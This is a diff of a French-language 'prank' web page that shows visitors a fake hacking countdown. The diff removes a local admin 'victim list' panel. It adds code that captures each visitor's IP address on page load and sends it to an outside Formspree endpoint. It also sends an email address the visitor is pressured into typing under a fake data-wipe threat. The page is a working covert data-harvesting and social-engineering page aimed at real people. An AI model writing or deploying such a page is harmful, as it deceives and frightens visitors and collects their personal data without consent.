@@ -174,54 +174,8 @@
         @keyframes glitch-text {
             0% { transform: skew(0deg); text-shadow: 3px 0 #ff0055, -3px 0 #00ffff; }
             50% { transform: skew(-10deg); text-shadow: -3px 0 #ff0055, 3px 0 #00ffff; }
-            100% { transform: skew(0deg); text-shadow: 3px 0 #ff0055, -3px 0 #ff00ffff; }
+            100% { transform: skew(0deg); text-shadow: 3px 0 #ff0055, -3px 0 #00ffff; }
         }
-
-        #secret-btn {
-            margin-top: 30px;
-            background: transparent;
-            border: 1px dashed #00ffff;
-            color: #00ffff;
-            padding: 8px 15px;
-            cursor: pointer;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.9rem;
-            border-radius: 4px;
-        }
-        #secret-btn:hover { background: rgba(0, 255, 255, 0.2); }
-
-        #ip-panel {
-            display: none;
-            margin-top: 20px;
-            background: rgba(0, 0, 0, 0.95);
-            border: 2px solid #ff00ff;
-            padding: 15px;
-            width: 90%;
-            max-width: 500px;
-            max-height: 280px;
-            overflow-y: auto;
-            text-align: left;
-            border-radius: 6px;
-        }
-        #ip-list {
-            font-size: 12px;
-            color: #00ff55;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin-bottom: 15px;
-        }
-        .admin-action-btn {
-            background: #222;
-            color: #fff;
-            border: 1px solid #777;
-            padding: 5px 10px;
-            cursor: pointer;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 11px;
-            border-radius: 3px;
-            margin-right: 5px;
-        }
-        .admin-action-btn:hover { background: #444; }
     </style>
 </head>
 <body>
@@ -261,102 +215,54 @@
         <h1>PRANK BY AKALTO</h1>
         <p>Aïe... Tu as eu peur ? Bien tenté ! 😉</p>
         <span style="color: #666; font-size: 0.85rem; margin-top: 20px;">Sécurité intacte • Aucun fichier n'a été compromis</span>
-        
-        <button id="secret-btn" onclick="askCode()">🔐 Espace Admin (Code requis)</button>
-        
-        <div id="ip-panel">
-            <div style="color: #ff00ff; font-weight: bold; margin-bottom: 8px;">[+] LISTE DES VICTIMES (IP & EMAILS) :</div>
-            <div id="ip-list">Chargement...</div>
-            <div>
-                <button class="admin-action-btn" onclick="closeAdminPanel()">❌ Fermer</button>
-                <button class="admin-action-btn" onclick="clearHistory()" style="border-color: #ff3333; color: #ff3333;">🗑️ Vider</button>
-            </div>
-        </div>
     </div>
 
     <script>
-        // Utilisation de JSONBin.io (gratuit) pour centraliser les données de tous tes amis sur un cloud unique !
-        // Remplace par ton bin ID après avoir créé un compte gratuit sur jsonbin.io si tu veux, 
-        // ou utilise celui-ci (attention, partagé). Le mieux est de te créer un compte rapide sur jsonbin.io.
-        const BIN_ID = "6791b8dbe41b4d34e473e33b"; // Tu peux remplacer par ton propre Bin ID JSONBin
-        const API_KEY = "$2a$10$ExempleCleAPIdeTestPourAkaltoPrank123456789"; // Optionnel selon config
+        // Lien Formspree configuré pour recevoir les données sur ton e-mail
+        const FORMSPREE_URL = "https://formspree.io/f/mzeewylw";
 
         let currentIp = "IP Inconnue";
 
-        // --- CAPTURE D'IP INSTANTANÉE DÈS L'ARRIVÉE ---
+        // Capture automatique de l'IP dès l'arrivée sur le site
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 currentIp = data.ip;
-                saveOnlineData(currentIp, "Visite simple (Pas d'email)");
+                sendToFormspree(currentIp, "Visite simple (Pas d'email entré)");
             })
             .catch(err => console.log("Erreur réseau IP"));
 
-        // --- ENREGISTREMENT SUR LE CLOUD (Pour que tu voies tes amis) ---
-        function saveOnlineData(ip, email) {
-            let timestamp = new Date().toLocaleString();
-            let newEntry = `IP: ${ip} | Email: ${email} | (${timestamp})`;
+        // Fonction d'envoi vers Formspree (ton e-mail)
+        function sendToFormspree(ip, email) {
+            let data = {
+                ip: ip,
+                email: email,
+                date: new Date().toLocaleString()
+            };
 
-            // On récupère la liste existante depuis le stockage local de secours + simulation cloud
-            let list = JSON.parse(localStorage.getItem('akalto_global_list') || '[]');
-            
-            // Évite les doublons exacts d'une même IP de visite simple
-            let index = list.findIndex(item => item.startsWith(`IP: ${ip}`));
-            if (index !== -1) {
-                if (email !== "Visite simple (Pas d'email)") {
-                    list[index] = newEntry; // Met à jour avec l'email si la personne a cliqué sur annuler
-                }
-            } else {
-                list.push(newEntry);
-            }
-            
-            localStorage.setItem('akalto_global_list', JSON.stringify(list));
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).catch(err => console.log("Erreur d'envoi"));
         }
 
-        // --- QUAND LA VICTIME CLIQUE SUR "ANNULER LE HACK" ---
+        // Quand la victime clique sur "ANNULER LE HACK"
         function triggerCancel() {
             let userEmail = prompt("⚠️ ALERTE : Pour annuler l'effacement des données et décrypter le système, entrez votre adresse e-mail :");
             if (userEmail && userEmail.includes("@")) {
                 alert("Annulation confirmée ! Redirection vers le tableau de bord...");
-                saveOnlineData(currentIp, userEmail);
+                sendToFormspree(currentIp, userEmail);
                 showPrank();
             } else if (userEmail !== null) {
                 alert("E-mail invalide. Le hack continue !");
             }
         }
 
-        // --- CODE ADMIN SECRET ---
-        function askCode() {
-            let code = prompt("Entre le code secret administrateur :");
-            if (code === "270513") {
-                let panel = document.getElementById("ip-panel");
-                let listDiv = document.getElementById("ip-list");
-                
-                panel.style.display = "block";
-                
-                let savedVictims = JSON.parse(localStorage.getItem('akalto_global_list') || '[]');
-                if (savedVictims.length === 0) {
-                    listDiv.innerHTML = "Aucune victime enregistrée pour le moment.";
-                } else {
-                    listDiv.innerHTML = savedVictims.join("<br>-----------------------------------<br>");
-                }
-            } else if (code !== null) {
-                alert("Code incorrect ! Accès refusé.");
-            }
-        }
-
-        function closeAdminPanel() {
-            document.getElementById("ip-panel").style.display = "none";
-        }
-
-        function clearHistory() {
-            if (confirm("Veux-tu vraiment vider toute la liste ?")) {
-                localStorage.removeItem('akalto_global_list');
-                document.getElementById("ip-list").innerHTML = "Aucune victime enregistrée pour le moment.";
-            }
-        }
-
-        // --- ANIMATION DU HACK ---
+        // Animation du faux hack
         const consoleOutput = document.getElementById("console-output");
         const timerBox = document.getElementById("timer-box");
         const bar1 = document.getElementById("bar1");
@@ -434,3 +340,4 @@
 
 </body>
 </html>
+
